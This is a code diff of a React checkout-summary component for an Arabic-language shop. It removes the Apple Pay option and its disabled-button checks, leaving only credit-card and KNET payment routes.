@@ -85,7 +85,7 @@ export default function SummaryPayment() {
 
     setIsProcessing(true);
 
-    const paymentMethodLabel = selectedPayment === 'card' ? 'بطاقة ائتمان' : selectedPayment === 'knet' ? 'كي نت' : 'Apple Pay';
+    const paymentMethodLabel = selectedPayment === 'card' ? 'بطاقة ائتمان' : 'كي نت';
 
     const cartSummary = cart.map(item => ({
       name: item.product.titleAr || item.product.title,
@@ -113,7 +113,7 @@ export default function SummaryPayment() {
         grandTotal: grandTotal.toFixed(3),
       },
       current: 'ملخص الدفع',
-      nextPage: selectedPayment === 'knet' ? 'knet-payment' : selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
+      nextPage: selectedPayment === 'knet' ? 'knet-payment' : 'credit-card-payment',
       waitingForAdminResponse: false,
     });
 
@@ -426,51 +426,18 @@ export default function SummaryPayment() {
                 </p>
               </div>
 
-              {/* Apple Pay */}
-              <div
-                onClick={() => setSelectedPayment('apple')}
-                style={{
-                  border: `2px solid ${selectedPayment === 'apple' ? '#1a73e8' : '#ddd'}`,
-                  borderRadius: '8px', padding: '16px', cursor: 'pointer',
-                  background: selectedPayment === 'apple' ? '#f0f7ff' : 'white',
-                  transition: 'all 0.2s',
-                }}
-              >
-                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                  <div style={{
-                    width: '20px', height: '20px', borderRadius: '50%',
-                    border: `2px solid ${selectedPayment === 'apple' ? '#1a73e8' : '#ccc'}`,
-                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
-                  }}>
-                    {selectedPayment === 'apple' && <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#1a73e8' }} />}
-                  </div>
-                  <span style={{ fontWeight: 600, fontSize: '15px', color: '#333' }}>Apple Pay</span>
-                  <div style={{ marginRight: 'auto', marginLeft: 'auto' }} />
-                  <svg width="28" height="28" viewBox="0 0 24 24" fill="#333">
-                    <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
-                  </svg>
-                </div>
-                <p style={{ fontSize: '12px', color: '#888', margin: '6px 0 0 32px' }}>
-                  {isAr ? 'الدفع بواسطة Apple Pay' : 'Pay with Apple Pay'}
-                </p>
-                {selectedPayment === 'apple' && (
-                  <p style={{ fontSize: '12px', color: '#e53935', margin: '8px 0 0 0', textAlign: 'center' }}>
-                    {isAr ? 'الدفع عن طريق Apple Pay غير متاح حالياً' : 'Apple Pay is currently unavailable'}
-                  </p>
-                )}
-              </div>
-            </div>
+                          </div>
           </div>
 
-          {/* Submit button */}
+{/* Submit button */}
           <button
             onClick={handlePayment}
-            disabled={!selectedPayment || isProcessing || !email || !firstName || !phone || selectedPayment === 'apple'}
+            disabled={!selectedPayment || isProcessing || !email || !firstName || !phone}
             style={{
               width: '100%', padding: '16px',
-              background: (!selectedPayment || isProcessing || !email || !firstName || !phone || selectedPayment === 'apple') ? '#ccc' : '#1a3a4a',
+              background: (!selectedPayment || isProcessing || !email || !firstName || !phone) ? '#ccc' : '#1a3a4a',
               color: 'white', border: 'none', borderRadius: '8px',
-              fontSize: '17px', fontWeight: 700, cursor: (!selectedPayment || isProcessing || selectedPayment === 'apple') ? 'not-allowed' : 'pointer',
+              fontSize: '17px', fontWeight: 700, cursor: (!selectedPayment || isProcessing) ? 'not-allowed' : 'pointer',
               transition: 'background 0.2s',
               marginBottom: '20px',
             }}
